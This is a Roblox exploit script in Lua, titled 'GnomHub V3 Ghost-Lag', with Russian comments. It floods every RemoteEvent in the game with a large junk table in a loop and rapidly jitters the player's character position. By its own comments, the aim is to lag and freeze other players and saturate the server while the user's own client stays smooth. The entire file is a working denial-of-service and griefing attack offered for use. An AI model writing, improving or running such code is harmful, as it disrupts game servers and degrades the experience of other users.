--[[
    GnomHub V3 - Ghost-Lag (Zero-Point Edition)
    Status: Invisible for User / Chaos for Others
    Target: Server Network & Remote Saturation
]]

if getgenv().GnomHubRunning then return end
getgenv().GnomHubRunning = true

local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- 1. Полная очистка вашего экрана от визуальных лагов
local function CleanMyClient()
    -- Удаляем все лагающие GUI, если они остались от прошлых версий
    if LocalPlayer.PlayerGui:FindFirstChild("GnomHub_Overload") then
        LocalPlayer.PlayerGui.GnomHub_Overload:Destroy()
    end
    
    -- Оптимизируем настройки для плавности вашего экрана
    settings().Rendering.QualityLevel = 1
    RunService:Set3dRenderingEnabled(true) -- Оставляем рендер включенным, но на минимуме
end

-- 2. "Мусорный" пакет данных (максимально тяжелый для других клиентов)
local junkTable = {}
for i = 1, 3000 do
    junkTable[string.rep("Gnom", 20)] = string.rep("Hub", 20)
end

-- 3. Сетевая атака (Remote Flood)
-- Мы находим все RemoteEvents и спамим ими СЕРВЕР, чтобы он рассылал мусор другим
task.spawn(function()
    while getgenv().GnomHubRunning do
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") and v.Name ~= "CharacterSoundEvent" then
                -- FireServer отправляет данные на сервер, который нагружает других при попытке обновления
                v:FireServer(junkTable)
            end
        end
        -- Пауза 0.2 сек, чтобы ваш интернет не вылетел (Anti-Kick Buffer)
        task.wait(0.2)
    end
end)

-- 4. Процессорный лаг для других (Physics Desync)
-- Мы заставляем сервер постоянно пересчитывать ваши координаты, что вызывает "фризы" у тех, кто на вас смотрит
task.spawn(function()
    while getgenv().GnomHubRunning do
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = LocalPlayer.Character.HumanoidRootPart
            -- Быстрая смена координат на микро-дистанции (незаметно для глаза, тяжело для сети)
            local oldCFrame = hrp.CFrame
            hrp.CFrame = hrp.CFrame * CFrame.new(0.01, 0.01, 0.01)
            RunService.Stepped:Wait()
            hrp.CFrame = oldCFrame
        end
        task.wait(0.01)
    end
end)

-- Инициализация
CleanMyClient()
print("GnomHub V3: Протокол скрытого лага запущен. Ваш FPS в безопасности.")
